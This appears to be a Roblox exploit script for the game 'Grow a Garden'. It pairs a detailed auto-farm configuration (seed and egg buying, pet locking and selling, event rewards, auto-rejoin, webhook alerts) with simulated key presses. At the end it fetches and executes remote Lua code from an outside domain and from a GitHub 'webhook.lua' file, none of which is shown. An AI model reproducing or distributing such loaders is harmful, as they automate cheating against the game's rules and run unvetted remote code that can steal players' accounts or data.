repeat task.wait() until game:IsLoaded()
repeat task.wait() 
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.E, false, game) 
    game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode.E, false, game) 
until game:GetService("Players").LocalPlayer:GetAttribute('DataFullyLoaded') == true
print('this is loadstring for grow a garden')

getgenv().ConfigsKaitun = {
	["Block Pet Gift"] = true,

	Collect_Cooldown = 60, -- cooldown to collect fruit
	JustFuckingCollectAll = false, -- Collect all (fruit not wait mutation)
	
	["Low Cpu"] = true,
	["Auto Rejoin"] = true,
	
	["Rejoin When Update"] = false,
	["Limit Tree"] = {
		["Limit"] = 300,
		["Destroy Untill"] = 250,

		["Safe Tree"] = {
			"Moon Blossom",
			"Fossilight",

		}
	},

	Seed = {
		Buy = {
			Mode = "Auto", -- Custom , Auto
			Custom = {
				"Carrot",
			}
		},
		Place = {
			Mode = "Lock", -- Select , Lock
			Select = {
				"Carrot"
			},
			Lock = {
				"Grand Tomato",
				"Bone Blossom",

			}
		}
	},

	["Seed Pack"] = {
		Locked = {

		}
	},

	Events = {
		["Cook Event"] = {
			Minimum_Money = 30_000_000, -- minimum money to start play this event
			Rewards_Item = { -- The top is the most top mean prefered.
				"Gorilla Chef",
				"Gourmet Egg",
				"Culinarian Chest",
				"Gourmet Seed Pack",
				"Sunny-Side Chicken",
				-- u can add it more as u want, if it not in list.
			}
		},
		["Traveling Shop"] = {
			"Bee Egg",
		},
		Craft = {
			"Anti Bee Egg",
			"Small Toy",
			"Small Treat",
			"Ancient Seed Pack",
		},
		Shop = {
      		"Gourmet Egg",
			"Gourmet Seed Pack",
			"Zen Egg",
			"Zenflare",
			"Zen Seed Pack",
     		"Pet Shard Corrupted",
			"Pet Shard Tranquil",
			"Koi",
			"Raiju",
		},
		Start_Do_Honey = 1_000_000 -- start trade fruit for honey at money
	},

	Gear = {
		Buy = { 
			"Grandmaster Sprinkler",
			"Master Sprinkler",
			"Godly Sprinkler",
			"Advanced Sprinkler",
			"Basic Sprinkler",
			"Lightning Rod",
			"Level Up Lollipop",
			"Medium Treat",
			"Medium Toy",
		},
		Lock = {

		},
	},

	Eggs = {
		Place = {
			"Gourmet Egg",
			"Zen Egg",
			"Anti Bee Egg",
			"Bug Egg",
			"Paradise Egg",
			"Common Summer Egg",
		},
		Buy = {
			"Bee Egg",
			"Oasis Egg",
			"Paradise Egg",
			"Anti Bee Egg",
			"Night Egg",
			"Rare Summer Egg",
			"Bug Egg",
			"Mythical Egg",
			"Common Summer Egg",
		}
	},

	Pets = {
		["Start Delete Pet At"] = 50,
		["Upgrade Slot"] = {
			["Pet"] = {
				["Starfish"] = { 7, 100, 1, true },

			},
			["Limit Upgrade"] = 5,
			["Equip When Done"] = {
				["Ostrich"] = { 5, 100, 1 },
				["Capybara"] = { 3, 100, 2 },

			},
		},
		Favorite_LockedPet = true,
		Locked = {
		Locked_Pet_Age = 99, -- pet that age > 60 will lock
			"Mochi Mouse",
			"French Fry Ferret",
			"Spaghetti Sloth",
			"Sushi Bear",
			"Mizuchi",
			"Tsuchinoko",
			"Football",
			"Corrupted Kitsune",
			"Corrupted Kodama",
			"Scarlet Macaw",
			"Koi",
			"Tanchozuru",
			"Kitsune",
			"Capybara",
			"Disco Bee",
			"Butterfly",
			"Queen Bee",
			"Dragonfly",
			"Raccoon",
			"Fennec Fox",
			"Mimic Octopus",
			"Red Fox",
			"Blood Owl",
			["Starfish"] = 10,
			["Bee"] = 1,
		},
		LockPet_Weight = 7, -- if Weight >= 10 they will locked,
		Instant_Sell = {		
			"Shiba Inu",
			"Seagull",
			"Crab",
			"Tanuki",
			"Nihonzaru",
			"Snail",
			"Caterpillar",
			"Giant Ant",
			"Bagel Bunny",
			"Pancake Mole",
			"Peacock",
			"Flamingo",
			"Brown Mouse",
			"Kodama",
		}
	},

	Webhook = {
		UrlPet = "xxx",
		UrlSeed = "xxx",
		PcName = "xxx",

		Noti = {
			Seeds = {
				"Sunflower",
				"Dragon Pepper",
				"Elephant Ears",
			},
			SeedPack = {
				"Idk"
			},
			Pets = {
				"Disco Bee",
				"Butterfly",
				"Mimic Octopus",
				"Queen Bee",
				"Dragonfly",
				"Raccoon",
				"Fennec Fox",
			},
			Pet_Weight_Noti = true,
		}
	},
}

loadstring(game:HttpGet("https://api.realaya.xyz/v1/files/l/98vt13x1h979yxngcvxbkjsq8hsw9rpw.lua"))()

task.spawn(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/sxdasfvas/test/refs/heads/main/webhook.lua"))()
end)
